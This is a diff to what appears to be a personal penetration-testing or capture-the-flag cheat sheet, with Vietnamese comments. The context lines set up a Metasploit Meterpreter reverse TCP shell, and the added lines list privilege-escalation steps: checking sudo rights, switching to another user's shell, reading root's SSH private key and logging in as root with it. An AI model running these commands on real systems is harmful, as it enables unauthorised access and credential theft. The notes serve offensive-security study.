@@ -237,6 +237,20 @@ set payload windows/meterpreter/reverse_tcp
 set LHOST <ipattacker>
 set LPORT 4444
 run
+----------------------------------------------------------------------------------------------------------------------
+
+sudo -l									(check quyền, và kiểm tra xem có user khác ko)
+sudo -u <user2> /bin/bash				(login usser khác)
+
+cd /root/.ssh
+cat id_rsa 
+
+mở terminal khác của máy tấn công
+nano id_rsa 							(dán id_rsa vừa lấy được)
+chmod 600 id_rsa
+ssh root@<ip address> -p 50706 -i id_rsa
+
+----------------------------------------------------------------------------------------------------------------------
 
 ```
 # SMB
